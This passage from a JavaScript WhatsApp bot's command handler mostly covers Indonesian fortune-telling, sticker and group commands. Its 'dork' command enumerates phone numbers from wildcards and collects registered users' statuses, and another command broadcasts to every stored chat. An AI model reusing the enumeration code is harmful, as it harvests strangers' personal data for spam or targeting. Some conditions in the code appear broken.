mediaUrl: "https://youtu.be/JmJtBUp-b1U",
sourceUrl: "https://youtu.be/JmJtBUp-b1U"
}}}, {quoted:m})
}
break
case 'ytad': {
miku.sendMessage(from, {audio:{url:args[0]}, mimetype:"audio/mp4", ptt:true, contextInfo:{externalAdReply:{
title:"fy.shizui",
body:"© C H I K A - B O T",
thumbnail: fs.readFileSync("lib/assets/Miku.jpg"),
mediaType:2,
mediaUrl: "https://youtu.be/JmJtBUp-b1Uk",
sourceUrl: "https://youtu.be/JmJtBUp-b1U"
}}}, {quoted:m})
}
break
            case 'setprofile': case 'setpp': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw 'Reply Image'
                if (/image/.test(mime)) throw `balas image dengan caption *${prefix + command}*`
                let media = await miku.downloadAndSaveMediaMessage(quoted)
                if (!m.isGroup && !isBotAdmins && !isGroupAdmins) {
                    await miku.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
		    await fs.unlinkSync(media)
                } else if (!isCreator) {
                    await miku.updateProfilePicture(miku.user.id, { url: media }).catch((err) => fs.unlinkSync(media))
		    await fs.unlinkSync(media)
                }
            }
            break
            case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
                if (args[0].toLowerCase() === 'close') {
                    await miku.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0].toLowerCase() === 'open') {
                    await miku.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                miku.send2ButMessage(m.chat, `MODE GROUP`, `B O T`, `${prefix}group close`, `CLOSE`, `${prefix}group open`, `OPEN`, m)
            }
            }
            break
case 'anticall': {
if (!isCreator) throw mess.owner
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (anticals === true) return
global.anticals = true
m.reply(`Berhasil mengaktifkan anticall!`)
} else if (args[0] === 'off') {
if (anticals === false) return
global.anticals = false
m.reply(`Berhasil menonaktifkan anticall!`)
} else {
m.reply('Pilih on atau off')
}
}
break
case 'npmjs': {
if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
case 'jadwalsholat': {
if (!text) throw 'kota apa?' 
	let res = await jadwalsholat(text)
	res = res.map(({ lokasi, daerah, jadwal }) => {
		delete jadwal.tanggal, delete jadwal.date
		jadwal = Object.keys(jadwal).map((v) => `• ${v.capitalize()}: ${jadwal[v]}`).join('\n')
		return `*Lokasi:* ${lokasi}\n*Daerah:* ${daerah}\n*Jadwal:*\n${jadwal}`
	}).join`\n\n`
	m.reply(res)
}
break
case 'pixivdl': case 'pixiv': {
	if (!text) throw 'Masukin Query / Pixiv Url'
	let res = await pixivDl(text)
	for (let i = 0; i < res.media.length; i++) {
		let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
		let mime = (await fromBuffer(res.media[i])).mime 
		await miku.sendMessage(m.chat, { [mime.split('/')[0]]: res.media[i], caption, mimetype: mime }, { quoted: m })
	}
}
break
case 'cekdrive':
 let cekdrive = require("node-os-utils")
let cekdr = await cekdrive.drive.info()
reply(`*DRIVE SERVER INFO*
⬣ Total : ${cekdr.totalGb} GB
⬣ Free : ${cekdr.freePercentage} GB
⬣ Used : ${cekdr.usedPercentage} GB`)
break
case 'cekbandwidth':
reply(`*BANDWIDTH*
⬣ Upload : ${cBandwidth.upload}
⬣ Download : ${cBandwidth.download}`)
break
case 'igstalk': {
if (!text) throw 'Ex .igstalk fy.shizui'
  let res = await igStalk(text)
  if (!res) throw res
  let caption = `
*Name:* ${res.name}
*Username:* ${res.username}
*Followers:* ${res.followersH}
*Following:* ${res.followingH}
*Posts:* ${res.postsH}
*Bio:*
${res.description}
`.trim()
  if (res.profilePic) return miku.sendMessage(m.chat, { image: { url: res.profilePic }, caption }, { quoted: m })
  m.reply(caption)
}
break
            case 'dork': {
let regex = /x/g
	if (!text) throw 'Input Number'
	if (!text.match(regex)) throw `Ex: ${prefix + command} ${m.sender.split('@')[0]}x`
	let random = text.match(regex).length, total = Math.pow(10, random), array = []
	for (let i = 0; i < total; i++) {
		let list = [...i.toString().padStart(random, '0')]
		let result = text.replace(regex, () => list.shift()) + '@s.whatsapp.net'
		if (await miku.onWhatsApp(result).then(v => (v[0] || {}).exists)) {
			let info = await miku.fetchStatus(result).catch(_ => {})
			array.push({ exists: true, jid: result, ...info })
		} else {
			array.push({ exists: false, jid: result })
		}
	}
	let txt = '• Registered\n\n' + array.filter(v => v.exists)
		.map(v => `No: wa.me/${v.jid.split('@')[0]}\nBio: ${v.status || ''}\nDate: ${formatDate(v.setAt)}`).join('\n\n')
	+ '\n\n• Unregister\n\n' + array.filter(v => !v.exists).map(v => v.jid.split('@')[0]).join('\n')
	m.reply(txt)
}
break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                let response = await miku.groupInviteCode(m.chat)
                miku.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                miku.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nomor HP :* ${anu.message.nomer_hp}\n➥  *Angka Shuzi :* ${anu.message.angka_shuzi}\n➥  *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n➥  *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Mimpi :* ${anu.message.mimpi}\n➥  *Arti :* ${anu.message.arti}\n➥  *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama Anda :* ${anu.message.nama_anda.nama}\n➥  *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➥  *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➥  *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➥  *Hasil :* ${anu.message.result}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama Anda :* ${anu.message.nama_anda.nama}\n➥  *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➥  *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➥  *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➥  *Hasil :* ${anu.message.result}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama Suami :* ${anu.message.suami.nama}\n➥  *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n➥  *Nama Istri :* ${anu.message.istri.nama}\n➥  *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n➥  *Hasil :* ${anu.message.result}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama Anda :* ${anu.message.nama_anda.nama}\n➥  *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➥  *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➥  *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➥  *Sisi Positif :* ${anu.message.sisi_positif}\n➥  *Sisi Negatif :* ${anu.message.sisi_negatif}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama :* ${anu.message.nama}\n➥  *Arti :* ${anu.message.arti}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'ttp': case 'ttpc': {
 let teg = `Contoh:\n` +
    `${prefix}ttp Halo sayang\n` +
    `${prefix}ttpc red Halo (warna merah)\n` +
    `${prefix}ttpc red Halo -blue (warna merah stroke biru)\n` +
    `${prefix}ttpc red+blue Halo (warna gradasi merah-biru)\n` +
    `${prefix}ttpc red+blue Halo -white (warna gradasi merah-biru stroke putih)\n`
    if (!text) return m.reply(teg)
    if (/-help/i.test(text.toLowerCase())) return m.reply(teg)
    m.reply('Wait...')
    let ttpBuff
    if (/pc/i.test(command)) {
        let col1 = text.includes('+') ? text.split(`+`)[0] : text.split(' ')[0] 
        let col2 = text.split(`+`)[1]?.split(' ')[0] || ''
        let strk = text.split(`-`)[1]
        let txt = text.split(' ')[1]?.split('-')[0]
        ttpBuff = await ttp(txt, col1, col2, strk).catch(e => {
            throw e
            })
    } else {
        let txt = m.quoted?.text || text
        ttpBuff = await ttp(txt).catch(e => { 
            throw e
        })
    }
    miku.sendImageAsSticker(m.chat, ttpBuff, m, { packname: packname, author: author })
}
break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama :* ${anu.message.nama}\n➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Life Path :* ${anu.message.life_path}\n➥  *Destiny :* ${anu.message.destiny}\n➥  *Destiny Desire :* ${anu.message.destiny_desire}\n➥  *Personality :* ${anu.message.personality}\n➥  *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendImage(m.chat,  anu.message.gambar, `➥  *Nama Anda :* ${anu.message.nama_anda}\n➥  *Nama Pasangan :* ${anu.message.nama_pasangan}\n➥  *Sisi Positif :* ${anu.message.sisi_positif}\n➥  *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Tanggal Pernikahan :* ${anu.message.tanggal}\n➥  *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Lahir :* ${anu.message.hari_lahir}\n➥  *Usaha :* ${anu.message.usaha}`, m)
            }
            break

            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Lahir :* ${anu.message.hari_lahir}\n➥  *Rezeki :* ${anu.message.rejeki}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Lahir :* ${anu.message.hari_lahir}\n➥  *Pekerjaan :* ${anu.message.pekerjaan}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Analisa :* ${anu.message.analisa}\n➥  *Angka Akar :* ${anu.message.angka_akar}\n➥  *Sifat :* ${anu.message.sifat}\n➥  *Elemen :* ${anu.message.elemen}\n➥  *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Analisa :* ${anu.message.analisa}\n➥  *Sektor :* ${anu.message.sektor}\n➥  *Elemen :* ${anu.message.elemen}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendImage(m.chat, anu.message.image, `➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Simbol Tarot :* ${anu.message.simbol_tarot}\n➥  *Arti :* ${anu.message.arti}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama :* ${anu.message.nama}\n➥  *Lahir :* ${anu.message.tahun_lahir}\n➥  *Gender :* ${anu.message.jenis_kelamin}\n➥  *Angka Kua :* ${anu.message.angka_kua}\n➥  *Kelompok :* ${anu.message.kelompok}\n➥  *Karakter :* ${anu.message.karakter}\n➥  *Sektor Baik :* ${anu.message.sektor_baik}\n➥  *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Kala Tinantang :* ${anu.message.kala_tinantang}\n➥  *Info :* ${anu.message.info}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Hasil :* ${anu.message.result}\n➥  *Info :* ${anu.message.info}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Hari Lahir :* ${anu.message.hari_lahir}\n➥  *Tanggal Lahir :* ${anu.message.tgl_lahir}\n➥  *Hari Naas :* ${anu.message.hari_naas}\n➥  *Info :* ${anu.message.catatan}\n➥  *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Hari Lahir :* ${anu.message.hari_lahir}\n➥  *Tanggal Lahir :* ${anu.message.tgl_lahir}\n➥  *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Hari Lahir :* ${anu.message.hari_lahir}\n➥  *tanggal Lahir :* ${anu.message.tgl_lahir}\n➥  *Arah Rezeki :* ${anu.message.arah_rejeki}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama :* ${anu.message.nama}\n➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n➥  *Hasil :* ${anu.message.result}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Tanggal :* ${anu.message.tanggal}\n➥  *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n➥  *Watak Hari :* ${anu.message.watak_hari}\n➥  *Naga Hari :* ${anu.message.naga_hari}\n➥  *Jam Baik :* ${anu.message.jam_baik}\n➥  *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama :* ${anu.message.nama}\n➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Nama :* ${anu.message.nama}\n➥  *Lahir :* ${anu.message.tgl_lahir}\n➥  *Hasil :* ${anu.message.result}`, m)
            }
            break //yy
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Tanggal :* ${anu.message.tgl_memancing}\n➥  *Hasil :* ${anu.message.result}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Hasil :* ${anu.message.result}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Zodiak :* ${anu.message.zodiak}\n➥  *Nomor :* ${anu.message.nomor_keberuntungan}\n➥  *Aroma :* ${anu.message.aroma_keberuntungan}\n➥  *Planet :* ${anu.message.planet_yang_mengitari}\n➥  *Bunga :* ${anu.message.bunga_keberuntungan}\n➥  *Warna :* ${anu.message.warna_keberuntungan}\n➥  *Batu :* ${anu.message.batu_keberuntungan}\n➥  *Elemen :* ${anu.message.elemen_keberuntungan}\n➥  *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n➥  *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                miku.sendText(m.chat, `➥  *Hasil :* ${anu.message}`, m)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} Rival`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Donasi',
                                    url: 'wa.me/6281314050985'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Owner',
                                    id: 'owner'
                                }
                            }]
                      ojan = fs.readFileSync('./lib/assets/Miku.jpg')
                      let txt = `-「 Broadcast 」-\n\n${text}`
                      miku.send5ButImg(yoi, txt, miku.user.name, ojan, btn)
                    }
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `› @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━› *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} › *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                miku.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await miku.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `› *Nama :* ${nama}\n› *User :* @${i.split('@')[0]}\n› *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 miku.sendTextWithMentions(m.chat, teks, m)
             }
             break
/*case 'ttc': case 'ttt': case 'tictactoe': {
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply('Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (args.join(" ") ? room.name === args.join(" ") : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await miku.sendText(room.x, str, m, { mentions: parseMention(str) } )
await miku.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (args.join(" ")) room.name = args.join(" ")
m.reply('Menunggu partner' + (args.join(" ") ? ` mengetik command dibawah ini ${prefix}${command} ${args.join(" ")}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
miku.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
m.reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
m.reply('rusak')
}
}
break*/
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

